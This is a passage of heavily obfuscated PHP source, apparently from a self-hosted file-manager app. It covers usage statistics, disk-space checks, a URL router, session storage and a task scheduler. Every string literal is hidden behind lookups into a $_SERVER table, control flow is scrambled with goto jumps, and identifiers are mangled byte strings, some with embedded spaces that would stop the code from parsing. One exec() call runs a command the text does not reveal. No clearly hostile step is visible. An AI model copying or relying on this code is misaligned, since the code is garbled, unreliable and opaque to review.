$_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÛø¨’¿£· = date($FÀ∫ìÑî·Í[2039], strtotime($FÀ∫ìÑî·Í[2040])); $bŒ∞›ÇÎ ’ = array($eÛø¨’¿£·); goto CïÎ∞ø¢ñﬁ; aÆ»ÔÌ≥Á¬: return $bŒ∞›ÇÎ ’; goto D¡˜€È§È; CïÎ∞ø¢ñﬁ: switch ($BáÙªÍÂ∆ı) { case $FÀ∫ìÑî·Í[1420]: $f´¯∫◊üûÇ = mktime(0, 0, 0, date($FÀ∫ìÑî·Í[2056]), date($FÀ∫ìÑî·Í[2057]) - date($FÀ∫ìÑî·Í[1229]) + 7 - 7, date($FÀ∫ìÑî·Í[2058])); $EïÉ∏éò¡î = 0; do { $aÉ•Ç‹¶Âò = date($FÀ∫ìÑî·Í[2039], $f´¯∫◊üûÇ - 3600 * 24 * 7 * $EïÉ∏éò¡î); $bŒ∞›ÇÎ ’[] = $aÉ•Ç‹¶Âò; $EïÉ∏éò¡î++; } while ($aó£◊éö§Ò < $aÉ•Ç‹¶Âò); break; case $FÀ∫ìÑî·Í[1418]: $EïÉ∏éò¡î = 1; do { $DÓöûÎúåÑ = date($FÀ∫ìÑî·Í[2059], strtotime("\x2d\x20{$EïÉ∏éò¡î}\40\x6d\x6f\156\x74\x68\x73")); $bŒ∞›ÇÎ ’[] = $DÓöûÎúåÑ; $EïÉ∏éò¡î++; } while ($aó£◊éö§Ò < $DÓöûÎúåÑ); break; case $FÀ∫ìÑî·Í[1727]: $b›ãã≤•¥’ = (int) date($FÀ∫ìÑî·Í[2058], strtotime($aó£◊éö§Ò)); $E›∂ñØÃ—‹ = (int) date($FÀ∫ìÑî·Í[2058]); if ($b›ãã≤•¥’ >= $E›∂ñØÃ—‹) { break; } for ($b›ãã≤•¥’; $b›ãã≤•¥’ < $E›∂ñØÃ—‹; $b›ãã≤•¥’++) { $bŒ∞›ÇÎ ’[] = $b›ãã≤•¥’ . $FÀ∫ìÑî·Í[2060]; } break; default: break; } if ($aó£◊éö§Ò > end($bŒ∞›ÇÎ ’)) { array_pop($bŒ∞›ÇÎ ’); } sort($bŒ∞›ÇÎ ’); goto aÆ»ÔÌ≥Á¬; D¡˜€È§È: } public function listTable($düùèÊﬁπõ) { $eÜ≠≠ïÍÿË = ucfirst($düùèÊﬁπõ); return Model($eÜ≠≠ïÍÿË)->listData(); } public function option($bÇ∞®Èç∆ÿ) { $fºµ∑õäÊ® = $_SERVER[Ä¿¡‡öóµŸﬂ‡][2061] . ucfirst($bÇ∞®Èç∆ÿ); return $this->{$fºµ∑õäÊ®}(); } private function optionUser() { goto fÛË…ÕÙîè; bÛ¶∑–†«í: if (!$DÖá±™°ï») { $DÖá±™°ï» = 1; } $EÔÂ∆ùÁ‡ = strtotime(date($EÇ≥ã·ééè[2043])); $fËéÃ∏≈Ñ≤ = array($EÇ≥ã·ééè[2064] => array($EÇ≥ã·ééè[932], $EÔÂ∆ùÁ‡)); goto dÒå™Ãî»§; dÒå™Ãî»§: $EÒÖêæãü” = Model($EÇ≥ã·ééè[477])->where($fËéÃ∏≈Ñ≤)->count($EÇ≥ã·ééè[1438]); return array($EÇ≥ã·ééè[695] => (int) $bô‘¨ã‡›∂, $EÇ≥ã·ééè[2065] => (int) ($bô‘¨ã‡›∂ - $eñä∑•ΩàÉ), $EÇ≥ã·ééè[2066] => (int) $eñä∑•ΩàÉ, $EÇ≥ã·ééè[2067] => (int) $EÒÖêæãü”, $EÇ≥ã·ééè[2068] => $DÖá±™°ï»); goto fÚ«·§‹Œç; D≥§éßøå : $EÔÂ∆ùÁ‡ = strtotime($EÇ≥ã·ééè[2063]); $fËéÃ∏≈Ñ≤ = array($EÇ≥ã·ééè[2064] => array($EÇ≥ã·ééè[932], $EÔÂ∆ùÁ‡)); $DÖá±™°ï» = (int) Model($EÇ≥ã·ééè[477])->where($fËéÃ∏≈Ñ≤)->count($EÇ≥ã·ééè[1438]); goto bÛ¶∑–†«í; fÛË…ÕÙîè: $EÇ≥ã·ééè =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bô‘¨ã‡›∂ = Model($EÇ≥ã·ééè[477])->count($EÇ≥ã·ééè[1438]); $eñä∑•ΩàÉ = Model($EÇ≥ã·ééè[477])->where($EÇ≥ã·ééè[2062])->count($EÇ≥ã·ééè[1438]); goto D≥§éßøå ; fÚ«·§‹Œç: } private function optionFile() { goto cÂØ√ú¯è∫; cÂØ√ú¯è∫: $eóù£‹–ÖÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CëøÂÉË∆‰ = $this->sourceSize(); $aÃ›ïñÊÔÚ = $CëøÂÉË∆‰[$eóù£‹–ÖÜ[77]]; goto aœ—§››‹«; aœ—§››‹«: $EŒﬁñ™Œë∫ = $CëøÂÉË∆‰[$eóù£‹–ÖÜ[2036]]; $CïÑû»¬ëÉ = Model($eóù£‹–ÖÜ[761])->where(array($eóù£‹–ÖÜ[370] => 0))->count($eóù£‹–ÖÜ[369]); $BŒÚÀΩ≈÷É = array($eóù£‹–ÖÜ[370] => 0, $eóù£‹–ÖÜ[187] => array($eóù£‹–ÖÜ[932], strtotime(date($eóù£‹–ÖÜ[2043])))); goto eîªÈ¿ù°€; eîªÈ¿ù°€: $E™ÏùÙ‡Û° = Model($eóù£‹–ÖÜ[761])->where($BŒÚÀΩ≈÷É)->sum($eóù£‹–ÖÜ[77]); $dΩ„äù—óù = Model($eóù£‹–ÖÜ[761])->where($BŒÚÀΩ≈÷É)->count($eóù£‹–ÖÜ[369]); return array($eóù£‹–ÖÜ[698] => $aÃ›ïñÊÔÚ, $eóù£‹–ÖÜ[2036] => $EŒﬁñ™Œë∫, $eóù£‹–ÖÜ[2069] => $aÃ›ïñÊÔÚ - $EŒﬁñ™Œë∫, $eóù£‹–ÖÜ[2070] => (int) $E™ÏùÙ‡Û°, $eóù£‹–ÖÜ[700] => (int) $CïÑû»¬ëÉ, $eóù£‹–ÖÜ[2071] => (int) $dΩ„äù—óù); goto AﬂÜÑ•≠∆Ø; AﬂÜÑ•≠∆Ø: } private function optionAccess() { $dí™¿êÕü∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($dí™¿êÕü∫[695] => $this->typeLogCnt(), $dí™¿êÕü∫[103] => $this->typeLogCnt($dí™¿êÕü∫[103]), $dí™¿êÕü∫[404] => $this->typeLogCnt($dí™¿êÕü∫[404]), $dí™¿êÕü∫[2072] => $this->typeLogCnt($dí™¿êÕü∫[2072]), $dí™¿êÕü∫[2073] => $this->typeLogCnt($dí™¿êÕü∫[2073]), $dí™¿êÕü∫[535] => $this->typeLogCnt($dí™¿êÕü∫[33], $dí™¿êÕü∫[2047])); } private function typeLogCnt($A€ΩÚó€áÉ = '', $fŒƒêÉßâ¢ = "\x69\144") { goto b©òøÕ®êÀ; b©òøÕ®êÀ: $CÏç∞òÖò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dçå¨ê®∂ = array($CÏç∞òÖò[103] => array($CÏç∞òÖò[2074], $CÏç∞òÖò[2075]), $CÏç∞òÖò[404] => array($CÏç∞òÖò[2076], $CÏç∞òÖò[2077]), $CÏç∞òÖò[2072] => array($CÏç∞òÖò[2078], $CÏç∞òÖò[2079], $CÏç∞òÖò[2080]), $CÏç∞òÖò[2073] => array($CÏç∞òÖò[2081], $CÏç∞òÖò[2082]), $CÏç∞òÖò[2083] => array($CÏç∞òÖò[2084], $CÏç∞òÖò[2085], $CÏç∞òÖò[2086])); $bóèπ¯å«ã = strtotime(date($CÏç∞òÖò[2043])); goto eÉ“à•ˆØ»; eÉ“à•ˆØ»: $A†◊†¥Ì¿Â = array($CÏç∞òÖò[187] => array($CÏç∞òÖò[932], $bóèπ¯å«ã)); if ($A€ΩÚó€áÉ) { $A†◊†¥Ì¿Â[$CÏç∞òÖò[29]] = array($CÏç∞òÖò[7], $Dçå¨ê®∂[$A€ΩÚó€áÉ]); } $FßôïãÖßæ = Model($CÏç∞òÖò[2046])->where($A†◊†¥Ì¿Â)->count($fŒƒêÉßâ¢); goto F‚∑„ã¶ÚÏ; F‚∑„ã¶ÚÏ: return (int) $FßôïãÖßæ; goto a•É∑õ∆óÒ; a•É∑õ∆óÒ: } private function optionServer() { goto A‘˜ŒÆã∆û; A‘˜ŒÆã∆û: $b—¬æ€¬é› =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Béﬁ∞èü«≠ = $this->diskDriver(); $eÉÈªµ¥•¡ = KodIO::defaultDriver(); goto b—¢ÂŒΩÀï; b—¢ÂŒΩÀï: $cäïﬁç•ú„ = array($b—¬æ€¬é›[752] => $eÉÈªµ¥•¡[$b—¬æ€¬é›[367]]); $FΩ‚≥À«ËÜ = Model($b—¬æ€¬é›[422])->where($cäïﬁç•ú„)->sum($b—¬æ€¬é›[77]); $AíﬁÌ∞è≥≥ = explode($b—¬æ€¬é›[50], $_SERVER[$b—¬æ€¬é›[139]]); goto bß’ÆÛ∫¡®; eãéºåÕÌ»: return array($b—¬æ€¬é›[2089] => $Béﬁ∞èü«≠ ? $Béﬁ∞èü«≠[$b—¬æ€¬é›[2090]] : 0, $b—¬æ€¬é›[2091] => $Béﬁ∞èü«≠ ? $Béﬁ∞èü«≠[$b—¬æ€¬é›[2092]] : 0, $b—¬æ€¬é›[2093] => (int) $eÉÈªµ¥•¡[$b—¬æ€¬é›[2090]] * 1024 * 1024 * 1024, $b—¬æ€¬é›[2094] => (int) $FΩ‚≥À«ËÜ, $b—¬æ€¬é›[2095] => ucfirst($EÜãòäÜ´∞), $b—¬æ€¬é›[2096] => $b—¬æ€¬é›[2097] . PHP_VERSION, $b—¬æ€¬é›[2098] => phpBuild64() ? 64 : 32, $b—¬æ€¬é›[694] => str_replace($b—¬æ€¬é›[2099], $b—¬æ€¬é›[908], $cﬂêïœ…îÊ), $b—¬æ€¬é›[337] => ucfirst($d‡¢⁄ûîÍß), $b—¬æ€¬é›[28] => $_SERVER[$b—¬æ€¬é›[2100]]); goto bº¨–“áŒï; bß’ÆÛ∫¡®: $EÜãòäÜ´∞ = $AíﬁÌ∞è≥≥[0]; $Dã¢ÆàÌÔé = $GLOBALS[$b—¬æ€¬é›[6]][$b—¬æ€¬é›[17]]; $cﬂêïœ…îÊ = $Dã¢ÆàÌÔé[$b—¬æ€¬é›[892]]; goto A–Ñ°°é‚¥; A–Ñ°°é‚¥: if ($cﬂêïœ…îÊ == $b—¬æ€¬é›[732]) { $eîå≈·—„– = explode($b—¬æ€¬é›[1080], $Dã¢ÆàÌÔé[$b—¬æ€¬é›[891]]); $cﬂêïœ…îÊ = $eîå≈·—„–[0]; } if ($cﬂêïœ…îÊ == $b—¬æ€¬é›[735] || $cﬂêïœ…îÊ == $b—¬æ€¬é›[736]) { $cë‚·≤π„ì = Model()->db()->query($b—¬æ€¬é›[2087]); $EπÂß„ôÚ» = $cë‚·≤π„ì[0] && isset($cë‚·≤π„ì[0][$b—¬æ€¬é›[1343]]) ? $cë‚·≤π„ì[0][$b—¬æ€¬é›[1343]] : 0; $cﬂêïœ…îÊ = $b—¬æ€¬é›[2088] . ($EπÂß„ôÚ» ? $b—¬æ€¬é›[8] . $EπÂß„ôÚ» : $b—¬æ€¬é›[33]); } $d‡¢⁄ûîÍß = $GLOBALS[$b—¬æ€¬é›[6]][$b—¬æ€¬é›[337]][$b—¬æ€¬é›[763]]; goto eãéºåÕÌ»; bº¨–“áŒï: } private function diskDriver() { goto C»ñ≤Ü¬≠ø; C»ñ≤Ü¬≠ø: $d÷“´†´å∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b‰·óã’»Û = $d÷“´†´å∫[8]; $Cùî™ ‡ì– = $GLOBALS[$d÷“´†´å∫[6]][$d÷“´†´å∫[2101]] == $d÷“´†´å∫[2102]; goto f˜´Ÿñº≠√; f˜´Ÿñº≠√: if ($Cùî™ ‡ì–) { $b‰·óã’»Û = $d÷“´†´å∫[2103]; if (function_exists($d÷“´†´å∫[2104])) { exec($d÷“´†´å∫[2105], $bÚ¥™«®≈É); $b‰·óã’»Û = $bÚ¥™«®≈É[1] . $d÷“´†´å∫[8]; } } if (!file_exists($b‰·óã’»Û)) { return; } $aı∞√öêëõ = @disk_total_space($b‰·óã’»Û); goto fÔÚóˆ®à◊; fÔÚóˆ®à◊: $f∑∏˜œÂﬂŒ = $aı∞√öêëõ - @disk_free_space($b‰·óã’»Û); return array($d÷“´†´å∫[2090] => $aı∞√öêëõ, $d÷“´†´å∫[2092] => $f∑∏˜œÂﬂŒ); goto Dë≤¥„›≈Î; Dë≤¥„›≈Î: } public function fileChart($c‹£∏•Éêı) { goto dåŒ¡Ö¥Ø˘; dåŒ¡Ö¥Ø˘: $Aäã⁄Ëë¢õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($c‹£∏•Éêı[$Aäã⁄Ëë¢õ[1438]])) { return Model($Aäã⁄Ëë¢õ[761])->userFileTypeProfile($c‹£∏•Éêı[$Aäã⁄Ëë¢õ[1438]]); } if (isset($c‹£∏•Éêı[$Aäã⁄Ëë¢õ[2106]])) { return Model($Aäã⁄Ëë¢õ[761])->groupFileTypeProfile($c‹£∏•Éêı[$Aäã⁄Ëë¢õ[2106]]); } goto cˆ·“â∫≥à; cˆ·“â∫≥à: $fº¡‡ÙÀ›™ = $this->sourceSize(); $dïçÔ∏•·é = array($Aäã⁄Ëë¢õ[461] => 0, $Aäã⁄Ëë¢õ[371] => 1); $FÚàı‘ÚÎâ = Model($Aäã⁄Ëë¢õ[761])->where($dïçÔ∏•·é)->sum($Aäã⁄Ëë¢õ[77]); goto C…»⁄ùÂßª; C…»⁄ùÂßª: $dïçÔ∏•·é[$Aäã⁄Ëë¢õ[371]] = 2; $AØÌ√„ÀÑŸ = Model($Aäã⁄Ëë¢õ[761])->where($dïçÔ∏•·é)->sum($Aäã⁄Ëë¢õ[77]); return array($Aäã⁄Ëë¢õ[698] => $fº¡‡ÙÀ›™[$Aäã⁄Ëë¢õ[77]], $Aäã⁄Ëë¢õ[2036] => $fº¡‡ÙÀ›™[$Aäã⁄Ëë¢õ[2036]], $Aäã⁄Ëë¢õ[2037] => (int) $FÚàı‘ÚÎâ, $Aäã⁄Ëë¢õ[2038] => (int) $AØÌ√„ÀÑŸ); goto DÀ∞∆Ñä¥ı; DÀ∞∆Ñä¥ı: } private function sourceSize() { $fØ≈†éªò¯ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B‹∑ÆèÑ⁄è = Model($fØ≈†éªò¯[761])->where(array($fØ≈†éªò¯[370] => 0))->sum($fØ≈†éªò¯[77]); $B±Ù›√¬òá = Model($fØ≈†éªò¯[422])->sum($fØ≈†éªò¯[77]); if ($B±Ù›√¬òá > $B‹∑ÆèÑ⁄è) { $B±Ù›√¬òá = $B‹∑ÆèÑ⁄è; } return array($fØ≈†éªò¯[77] => (int) $B‹∑ÆèÑ⁄è, $fØ≈†éªò¯[2036] => (int) $B±Ù›√¬òá); } } goto BßÏÎ™™˜ƒ; E’≈¿çÓ¬É: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\x2f\x5d\x2b", "\x3a\156\165\x6d" => "\133\60\x2d\x39\135\x2b", "\x3a\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($Eıºé˘ÏèÖ, $C≥ÖÖ°æı–) { $Bæ©Ì®Üùœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Eıºé˘ÏèÖ == $Bæ©Ì®Üùœ[1387]) { $f•ü˘˘„ÖÉ = array_map($Bæ©Ì®Üùœ[1388], $C≥ÖÖ°æı–[0]); $A√ÿ’‚«”  = strpos($C≥ÖÖ°æı–[1], $Bæ©Ì®Üùœ[8]) === 0 ? $C≥ÖÖ°æı–[1] : $Bæ©Ì®Üùœ[8] . $C≥ÖÖ°æı–[1]; $CßÃœ¢Ú¥¢ = $C≥ÖÖ°æı–[2]; } else { $f•ü˘˘„ÖÉ = null; $A√ÿ’‚«”  = strpos($C≥ÖÖ°æı–[0], $Bæ©Ì®Üùœ[8]) === 0 ? $C≥ÖÖ°æı–[0] : $Bæ©Ì®Üùœ[8] . $C≥ÖÖ°æı–[0]; $CßÃœ¢Ú¥¢ = $C≥ÖÖ°æı–[1]; } array_push(self::$maps, $f•ü˘˘„ÖÉ); array_push(self::$routes, $A√ÿ’‚«” ); array_push(self::$methods, strtoupper($Eıºé˘ÏèÖ)); array_push(self::$callbacks, $CßÃœ¢Ú¥¢); } public static function error($Eë∏¨Òßó¥) { self::$errorCallback = $Eë∏¨Òßó¥; } public static function haltOnMatch($Bñ·»¨®ô = true) { self::$halts = $Bñ·»¨®ô; } public static function dispatch() { goto Bé≤æ¢Õèà; Bé≤æ¢Õèà: $FÜ∑ÀﬁÊöè =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÌôåÇ¯Ì— = parse_url($_SERVER[$FÜ∑ÀﬁÊöè[1389]], PHP_URL_PATH); $EÜ£â¢È«› = $_SERVER[$FÜ∑ÀﬁÊöè[154]]; goto F⁄êßÕπ”€; EÜúÆÒÌÖ≈: self::$routes = preg_replace($FÜ∑ÀﬁÊöè[1077], $FÜ∑ÀﬁÊöè[8], self::$routes); if (in_array($BÌôåÇ¯Ì—, self::$routes)) { $f ŒŒƒˆñ¬ = array_keys(self::$routes, $BÌôåÇ¯Ì—); foreach ($f ŒŒƒˆñ¬ as $d®µ°ÊÑ„’) { if (self::$methods[$d®µ°ÊÑ„’] == $EÜ£â¢È«› || self::$methods[$d®µ°ÊÑ„’] == $FÜ∑ÀﬁÊöè[1390] || in_array($EÜ£â¢È«›, self::$maps[$d®µ°ÊÑ„’])) { $eá∞˘ß⁄Ñ— = !0; if (!is_object(self::$callbacks[$d®µ°ÊÑ„’])) { $AÑ¶©êÈë∞ = explode($FÜ∑ÀﬁÊöè[8], self::$callbacks[$d®µ°ÊÑ„’]); $fè”Ñ˜ú…è = end($AÑ¶©êÈë∞); $A™é’Ñ‚µµ = explode($FÜ∑ÀﬁÊöè[1391], $fè”Ñ˜ú…è); $Bã±¡ûùåΩ = new $A™é’Ñ‚µµ[0](); $Bã±¡ûùåΩ->{$A™é’Ñ‚µµ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$d®µ°ÊÑ„’]); if (self::$halts) { return; } } } } } else { $aâ‘´ÓÆ·Â = 0; foreach (self::$routes as $d®µ°ÊÑ„’) { if (strpos($d®µ°ÊÑ„’, $FÜ∑ÀﬁÊöè[4]) !== !1) { $d®µ°ÊÑ„’ = str_replace($cùÀ¿é—™¢, $D†é∂≥¡ﬁ¬, $d®µ°ÊÑ„’); } if (preg_match($FÜ∑ÀﬁÊöè[1392] . $d®µ°ÊÑ„’ . $FÜ∑ÀﬁÊöè[1393], $BÌôåÇ¯Ì—, $BÇßéçŒ‰¨)) { if (self::$methods[$aâ‘´ÓÆ·Â] == $EÜ£â¢È«› || self::$methods[$aâ‘´ÓÆ·Â] == $FÜ∑ÀﬁÊöè[1390] || !empty(self::$maps[$aâ‘´ÓÆ·Â]) && in_array($EÜ£â¢È«›, self::$maps[$aâ‘´ÓÆ·Â])) { $eá∞˘ß⁄Ñ— = !0; array_shift($BÇßéçŒ‰¨); if (!is_object(self::$callbacks[$aâ‘´ÓÆ·Â])) { $AÑ¶©êÈë∞ = explode($FÜ∑ÀﬁÊöè[8], self::$callbacks[$aâ‘´ÓÆ·Â]); $fè”Ñ˜ú…è = end($AÑ¶©êÈë∞); $A™é’Ñ‚µµ = explode($FÜ∑ÀﬁÊöè[1391], $fè”Ñ˜ú…è); $Bã±¡ûùåΩ = new $A™é’Ñ‚µµ[0](); if (!method_exists($Bã±¡ûùåΩ, $A™é’Ñ‚µµ[1])) { echo $FÜ∑ÀﬁÊöè[1394]; } else { call_user_func_array(array($Bã±¡ûùåΩ, $A™é’Ñ‚µµ[1]), $BÇßéçŒ‰¨); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$aâ‘´ÓÆ·Â], $BÇßéçŒ‰¨); if (self::$halts) { return; } } } } $aâ‘´ÓÆ·Â++; } } if ($eá∞˘ß⁄Ñ— == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $fÖ†îëŸÒ¨ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; header($_SERVER[$fÖ†îëŸÒ¨[1395]] . $fÖ†îëŸÒ¨[1396]); echo $fÖ†îëŸÒ¨[1397]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$FÜ∑ÀﬁÊöè[1389]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto f´◊ó€©«‹; F⁄êßÕπ”€: $cùÀ¿é—™¢ = array_keys(static::$patterns); $D†é∂≥¡ﬁ¬ = array_values(static::$patterns); $eá∞˘ß⁄Ñ— = !1; goto EÜúÆÒÌÖ≈; f´◊ó€©«‹: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto CØÈâÂ Öë; AÑ´àπûùŒ: $Fú‡± Õø = $Aﬂ´ü’•õü[$Eòê£´û≤É[1400]]; $E»éãÛßõë = $Aﬂ´ü’•õü[$Fú‡± Õø]; $fƒÏáó”äŒ = $Aﬂ´ü’•õü[$Eòê£´û≤É[764]]; goto CàÒÑ‰É∆; CàÒÑ‰É∆: switch ($Fú‡± Õø) { case $Eòê£´û≤É[17]: self::$handle = Model($Eòê£´û≤É[765]); break; case $Eòê£´û≤É[766]: self::$handle = new CacheRedis($E»éãÛßõë, $fƒÏáó”äŒ); break; case $Eòê£´û≤É[767]: self::$handle = new CacheMemcached($E»éãÛßõë, $fƒÏáó”äŒ); break; case $Eòê£´û≤É[167]: $E»éãÛßõë[$Eòê£´û≤É[75]] = $E»éãÛßõë[$Eòê£´û≤É[75]] . $Eòê£´û≤É[1401]; self::$handle = new CacheFile($E»éãÛßõë, $fƒÏáó”äŒ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $DΩ¨⁄÷∆Õ  = new self(); goto Eá€¡áÜ‚ü; CØÈâÂ Öë: $Eòê£´û≤É =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $DΩ¨⁄÷∆Õ  = false; if ($DΩ¨⁄÷∆Õ ) { return $DΩ¨⁄÷∆Õ ; } goto aòï€Ò¶Ÿ±; Eá€¡áÜ‚ü: return $DΩ¨⁄÷∆Õ ; goto f√›∂Öüª∞; aòï€Ò¶Ÿ±: $Aﬂ´ü’•õü = $GLOBALS[$Eòê£´û≤É[6]][$Eòê£´û≤É[337]]; self::$sessionTime = $Aﬂ´ü’•õü[$Eòê£´û≤É[1398]]; $Eô≈¿´ö≤Ù = SESSION_ID; goto d„ÕÉäß·π; d„ÕÉäß·π: $Eô≈¿´ö≤Ù = _get($GLOBALS, $Eòê£´û≤É[1399], $Eô≈¿´ö≤Ù); if (self::$sessionSign) { } else { if (Cookie::get($Eô≈¿´ö≤Ù)) { self::$sessionSign = Cookie::get($Eô≈¿´ö≤Ù); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Eô≈¿´ö≤Ù, self::$sessionSign, self::$sessionTime); goto AÑ´àπûùŒ; f√›∂Öüª∞: } public static function sign($FØâ¯Õü¿è = false) { $FØâ¯Õü¿è && (self::$sessionSign = $FØâ¯Õü¿è); self::init(); return self::$sessionSign; } public static function set($Dïë›ˆ¯≠Î, $cò¬ïñ±°é = false) { self::init(); if (is_array($Dïë›ˆ¯≠Î)) { foreach ($Dïë›ˆ¯≠Î as $c÷Çç∫ÆÂÖ => $A≠å∫≥—∆¡) { array_set_value(self::$data, $c÷Çç∫ÆÂÖ, $A≠å∫≥—∆¡); } } else { array_set_value(self::$data, $Dïë›ˆ¯≠Î, $cò¬ïñ±°é); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($c¥Î•à ïÚ = false) { self::init(); if (!$c¥Î•à ïÚ) { return self::$data; } return array_get_value(self::$data, $c¥Î•à ïÚ); } public static function remove($C”ºïá´ì∞) { self::init(); unset(self::$data[$C”ºïá´ì∞]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ä¿¡‡öóµŸﬂ‡][769])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Fﬂê∞ôÂ¨‚; CÂ¯ÏÌƒ‡: http_close(); self::valueSet($dâ¨ﬁùé§ƒ[1402], $dâ¨ﬁùé§ƒ[83]); Hook::bind($dâ¨ﬁùé§ƒ[1404], $dâ¨ﬁùé§ƒ[1405]); goto Fö®∫Ó›≈ˆ; Fö®∫Ó›≈ˆ: while (!0) { self::cacheClear(); if (self::valueGet($dâ¨ﬁùé§ƒ[689]) != $dâ¨ﬁùé§ƒ[83]) { self::valueSet($dâ¨ﬁùé§ƒ[1402], $dâ¨ﬁùé§ƒ[468]); self::log($dâ¨ﬁùé§ƒ[1406]); die; } self::valueSet($dâ¨ﬁùé§ƒ[1402], $dâ¨ﬁùé§ƒ[83]); self::valueSet($dâ¨ﬁùé§ƒ[1403], time()); self::taskRunAll(); sleep(self::valueGet($dâ¨ﬁùé§ƒ[1407])); } goto fÕˆÜÛØºë; Fﬂê∞ôÂ¨‚: $dâ¨ﬁùé§ƒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (self::valueGet($dâ¨ﬁùé§ƒ[689]) != $dâ¨ﬁùé§ƒ[83]) { return; } if (self::valueGet($dâ¨ﬁùé§ƒ[1402]) == $dâ¨ﬁùé§ƒ[83]) { $eÖÌ´¨∞õã = self::valueGet($dâ¨ﬁùé§ƒ[1403]); if (time() - $eÖÌ´¨∞õã > 3600 * 2) { self::restart(); } return; } goto CÂ¯ÏÌƒ‡; fÕˆÜÛØºë: } public static function restart() { $a«ªÙ∑©ëâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; http_close(); self::valueSet($a«ªÙ∑©ëâ[689], $a«ªÙ∑©ëâ[468]); sleep(self::valueGet($a«ªÙ∑©ëâ[1407]) + 5); self::valueSet($a«ªÙ∑©ëâ[1402], $a«ªÙ∑©ëâ[468]); self::valueSet($a«ªÙ∑©ëâ[689], $a«ªÙ∑©ëâ[83]); } public static function shutdownEvent() { $dä†ñØÑ∆ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::valueSet($dä†ñØÑ∆ç[1402], $dä†ñØÑ∆ç[468]); self::log($dä†ñØÑ∆ç[1408]); } public static function config($eèáœ÷£É°, $bàâí±´öˆ) { $cêµÕùöÜ≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dËó≥ã«˘ﬂ = 20; $bàâí±´öˆ = intval($bàâí±´öˆ) <= $dËó≥ã«˘ﬂ ? $dËó≥ã«˘ﬂ : intval($bàâí±´öˆ); self::valueSet($cêµÕùöÜ≥[689], $eèáœ÷£É°); self::valueSet($cêµÕùöÜ≥[1407], $bàâí±´öˆ); } private static function taskRunAll() { $DÀÇ√…Ø¶‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EäøÁ±âê£ = Model($DÀÇ√…Ø¶‹[1409])->listData(); $BﬂÁ◊≥õûê = count($EäøÁ±âê£); for ($aÚ•ÿªÎÖ– = 0; $aÚ•ÿªÎÖ– < $BﬂÁ◊≥õûê; $aÚ•ÿªÎÖ–++) { $AÛ‡¶¨¨ŒÍ = $EäøÁ±âê£[$aÚ•ÿªÎÖ–]; if ($AÛ‡¶¨¨ŒÍ[$DÀÇ√…Ø¶‹[1410]] != $DÀÇ√…Ø¶‹[83]) { continue; } if (!self::taskTimeCheck($AÛ‡¶¨¨ŒÍ)) { continue; } self::taskRun($AÛ‡¶¨¨ŒÍ); } Hook::trigger($DÀÇ√…Ø¶‹[1411]); } private static function taskTimeCheck($Dã«´¢ƒ˜è) { goto A„ÿ»ÂìÇÜ; A„ÿ»ÂìÇÜ: $D™Ù©≠ÍÀû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÊÓ‡÷ã≠â = json_decode($Dã«´¢ƒ˜è[$D™Ù©≠ÍÀû[190]], !0); $AÌ´≤éÌø· = intval($Dã«´¢ƒ˜è[$D™Ù©≠ÍÀû[1403]]); goto E£ìßΩÁúê; C¨öªˆœŒˆ: switch ($bÊÓ‡÷ã≠â[$D™Ù©≠ÍÀû[29]]) { case $D™Ù©≠ÍÀû[1418]: if (time() - $AÌ´≤éÌø· < 3600 * 24 * 30) { return !1; } if ($bÊÓ‡÷ã≠â[$D™Ù©≠ÍÀû[1418]] == date($D™Ù©≠ÍÀû[1419]) && $A‡∫ﬁ æ∫à) { return !0; } break; case $D™Ù©≠ÍÀû[1420]: if (time() - $AÌ´≤éÌø· < 3600 * 24 * 7) { return !1; } $Búå¨ÑãπΩ = date($D™Ù©≠ÍÀû[1421]) == 0 ? 7 : date($D™Ù©≠ÍÀû[1421]); if ($bÊÓ‡÷ã≠â[$D™Ù©≠ÍÀû[1420]] == $Búå¨ÑãπΩ && $A‡∫ﬁ æ∫à) { return !0; } break; case $D™Ù©≠ÍÀû[1413]: if (time() - $AÌ´≤éÌø· < 3600 * 24) { return !1; } if ($A‡∫ﬁ æ∫à) { return !0; } break; case 